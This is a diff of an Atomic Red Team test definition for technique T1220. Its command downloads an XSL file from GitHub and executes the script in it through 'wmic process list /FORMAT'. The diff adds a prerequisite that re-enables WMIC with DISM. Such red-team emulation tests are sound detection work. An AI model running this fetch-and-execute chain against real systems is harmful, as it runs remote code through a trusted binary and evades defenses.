@@ -11,7 +11,9 @@
         command: 'if (Test-Path "PathToAtomicsFolder\T1220\src\wmicscript.xsl") {exit
           0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1220\src\wmicscript.xsl")
           -ErrorAction Ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl"
-          -OutFile "PathToAtomicsFolder\T1220\src\wmicscript.xsl"; fi; wmic process
+          -OutFile "PathToAtomicsFolder\T1220\src\wmicscript.xsl"; fi; if (Test-Path
+          "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0} else {exit 1}; then :
+          ; else DISM /Online /Add-Capability /CapabilityName:WMIC~~~~; fi; wmic process
           list /FORMAT:"PathToAtomicsFolder\T1220\src\wmicscript.xsl"'
   plugin: atomic
   singleton: false
@@ -20,8 +22,8 @@
   privilege: ''
   buckets:
   - t1220
-  - atomic-red-team
   - stealth
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -47,6 +49,18 @@
         -OutFile "#{local_xsl_file}"
 
         '
+    - description: 'wmic.exe must be present on the system. It is disabled by default
+        on Windows 11, version 24H2 and later, and removed when upgrading to version
+        25H2.
+
+        '
+      prereq_command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit
+        0} else {exit 1}
+
+        '
+      get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+        '
     technique_created: '2018-10-17T00:14:20.652Z'
     atomic_guid: 1b237334-3e21-4a0c-8178-b8c996124988
-    import_timestamp: '2026-08-17T02:58:42.305090Z'
+    import_timestamp: '2026-08-18T02:56:40.545106Z'
